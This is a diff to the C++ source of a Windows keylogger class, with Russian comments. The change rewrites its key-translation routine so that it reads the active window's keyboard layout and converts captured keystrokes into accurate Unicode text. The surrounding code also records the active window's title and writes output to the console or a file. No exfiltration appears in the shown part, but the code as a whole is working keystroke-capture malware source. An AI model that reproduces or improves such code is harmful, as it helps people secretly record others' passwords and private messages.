@@ -207,67 +207,66 @@ void KeyLogger::triggerOutput()
     std::cout << "\nОжидание следующего триггера...\n> ";
 }
 
-std::string KeyLogger::virtualKeyToString(const DWORD vkCode) {
-    struct KeyMap {
-        DWORD vkCode;
-        const char* name;
-    };
-
-    static const KeyMap keyMap[] = {
-        {VK_LBUTTON, "[ЛКМ]"},
-        {VK_RBUTTON, "[ПКМ]"},
-        {VK_BACK, "[Backspace]"},
-        {VK_TAB, "[Tab]"},
-        {VK_RETURN, "[Enter]"},
-        {VK_SHIFT, "[Shift]"},
-        {VK_CONTROL, "[Ctrl]"},
-        {VK_MENU, "[Alt]"},
-        {VK_CAPITAL, "[CapsLock]"},
-        {VK_ESCAPE, "[Esc]"},
-        {VK_SPACE, "[Space]"},
-        {VK_PRIOR, "[PageUp]"},
-        {VK_NEXT, "[PageDown]"},
-        {VK_END, "[End]"},
-        {VK_HOME, "[Home]"},
-        {VK_LEFT, "[Left]"},
-        {VK_UP, "[Up]"},
-        {VK_RIGHT, "[Right]"},
-        {VK_DOWN, "[Down]"},
-        {VK_INSERT, "[Insert]"},
-        {VK_DELETE, "[Delete]"},
-        {VK_LWIN, "[Win]"},
-        {VK_RWIN, "[Win]"},
-        {0, nullptr}
-    };
-
-    for (int i = 0; keyMap[i].name != nullptr; i++) {
-        if (keyMap[i].vkCode == vkCode) {
-            return keyMap[i].name;
-        }
+std::string KeyLogger::virtualKeyToString(DWORD vkCode)
+{
+    BYTE keyboardState[256];
+    if (!GetKeyboardState(keyboardState)) {
+        return "";
     }
 
-    if (vkCode >= 'A' && vkCode <= 'Z') {
-        const bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-        const bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+    // Получаем раскладку активного окна
+    HWND hwnd = GetForegroundWindow();
+    DWORD threadId = GetWindowThreadProcessId(hwnd, nullptr);
+    HKL layout = GetKeyboardLayout(threadId);
 
-        bool uppercase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
-        char c = static_cast<char>(vkCode);
-        if (!uppercase) {
-            c = tolower(c);
-        }
-        return std::string(1, c);
+    wchar_t buffer[5] = {0};
+
+    UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout);
+
+    int result = ToUnicodeEx(
+        vkCode,
+        scanCode,
+        keyboardState,
+        buffer,
+        4,
+        0,
+        layout
+    );
+
+    if (result > 0) {
+        return StringUtils::utf16_to_utf8(std::wstring(buffer, result));
     }
 
-    if (vkCode >= '0' && vkCode <= '9') {
-        return std::string(1, static_cast<char>(vkCode));
+    switch (vkCode) {
+        case VK_LBUTTON: return "[ЛКМ]";
+        case VK_RBUTTON: return "[ПКМ]";
+        case VK_BACK: return "[Backspace]";
+        case VK_TAB: return "[Tab]";
+        case VK_RETURN: return "[Enter]";
+        case VK_SHIFT: return "[Shift]";
+        case VK_CONTROL: return "[Ctrl]";
+        case VK_MENU: return "[Alt]";
+        case VK_CAPITAL: return "[CapsLock]";
+        case VK_ESCAPE: return "[Esc]";
+        case VK_PRIOR: return "[PageUp]";
+        case VK_NEXT: return "[PageDown]";
+        case VK_END: return "[End]";
+        case VK_HOME: return "[Home]";
+        case VK_LEFT: return "[Left]";
+        case VK_UP: return "[Up]";
+        case VK_RIGHT: return "[Right]";
+        case VK_DOWN: return "[Down]";
+        case VK_INSERT: return "[Insert]";
+        case VK_DELETE: return "[Delete]";
+        case VK_LWIN:  return "[lWin]";
+        case VK_RWIN:  return "[rWin]";
+        default:
+            return "[Key:" + std::to_string(vkCode) + "]";
     }
 
-    if (vkCode >= VK_F1 && vkCode <= VK_F24) {
-        return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
-    }
 
-    return "[Key:" + std::to_string(vkCode) + "]";
 }
+
 
 std::string KeyLogger::getActiveWindowTitle() {
     HWND foreground = GetForegroundWindow();
@@ -350,7 +349,7 @@ void KeyLogger::setOutputToConsole(const bool enable) {
 
 void KeyLogger::setOutputToFile(const std::string& filename) {
     s_outputFilename = filename;
-    
+
     if (!filename.empty()) {
         std::ofstream file(filename, std::ios::trunc);
 
